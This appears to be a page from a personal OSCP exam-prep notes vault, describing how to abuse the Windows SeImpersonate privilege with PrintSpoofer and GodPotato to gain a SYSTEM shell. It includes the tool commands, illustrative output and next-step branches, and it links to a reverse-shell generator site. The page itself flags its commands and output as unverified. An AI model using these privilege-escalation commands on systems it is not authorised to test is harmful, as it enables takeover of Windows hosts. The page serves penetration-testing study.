# Windows - SeImpersonate Abuse

**Step 29 of 50 · Windows**

*Use an enabled impersonation privilege to attempt a SYSTEM shell.*

## Run this

> **Why:** This command gathers the windows seimpersonate abuse evidence needed to decide which documented route applies next.
```powershell
PrintSpoofer.exe -i -c powershell.exe
GodPotato.exe -cmd "whoami"
```

## Example output

 > *Example shape only: these exact tool invocations are not yet verified against a real box.*
```
[+] Attempting token impersonation
C:\> whoami
nt authority\system
```
## What did you get?

- [ ] SYSTEM shell is returned → **Run `whoami` and `whoami /groups`; `nt authority\\system` confirms SYSTEM, then go to Step 33 · [[Windows - Clean Down]]**
- [ ] The tool fails on this OS → **Check the Windows build and return to Step 28 · [[Windows - Privilege Triage]]**
- [ ] The privilege is absent → **Go to Step 30 · [[Windows - Service Abuse]]**

## Notes

These exact tool invocations are not directly demonstrated in the MarkUp write-up or the Forest and Sauna write-ups.

## Gotcha

> [!warning] 💡
> The command and binary choice are not yet verified against the current vault box transcripts. Confirm before relying on this page.
## Seen in
- [[OSCP/BOXES/WRITE UPS/Windows/Servmon|Servmon]] -- confirmed in the box write-up

## Related stages

- [[Windows - Service Scan]]
- [[Windows - Web Enum]]
- [[Windows - SMB Enum]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
